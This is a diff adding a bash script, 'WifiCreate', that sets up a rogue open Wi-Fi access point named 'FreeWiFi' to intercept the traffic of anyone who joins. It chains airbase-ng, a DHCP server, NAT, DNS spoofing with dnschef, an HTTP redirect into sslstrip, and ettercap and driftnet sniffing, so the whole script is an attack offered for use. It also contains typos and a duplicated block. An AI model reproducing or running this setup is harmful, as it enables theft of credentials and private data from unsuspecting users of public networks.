@@ -1,0 +1,50 @@
+
+#!/bin/bash
+#WifiCreate
+
+#set in mode monitor
+rfkill unblock all
+ifconfig wlan0 down
+iwconfig wlan0 mode moniter &
+sleep 2
+ifconfig wlan0 up
+
+#mode check
+airmon-ng check kill
+airmon-ng start wlan0 &
+sleep 2
+
+#start Wifi
+gnome-terminal -x bash -c "airbase-ng -e FreeWiFi -c 6 wlan0"
+sleep 2
+
+#virtual card
+ifconfig at0 up
+ifconfig at0 10.0.0.1 netmask 255.255.255.0
+ifconfig at0 mtu 1492
+                                                           
+fconfig at0 10.0.0.1 netmask 255.255.255.0
+ifconfig at0 mtu 1492
+route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+#dhcp configuration
+dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0
+echo "Before Start~" &
+sleep 2
+service isc-dhcp-server start &
+sleep 3
+
+#nat
+iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
+iptables -A FORWARD -p tcp --syn -s 10.0.0.0/24 -j TCPMSS --set-mss 1356
+gnome-terminal -x bash -c "dnschef -i 10.0.0.1 --nameserver 210.73.64.1"
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+#sniff&trap
+gnome-terminal -x bash -c "sslstrip -fpk 10000"
+gnome-terminal -x bash -c "ettercap -Tpuqi at0"
+driftnet -i at0
+                      
+
+
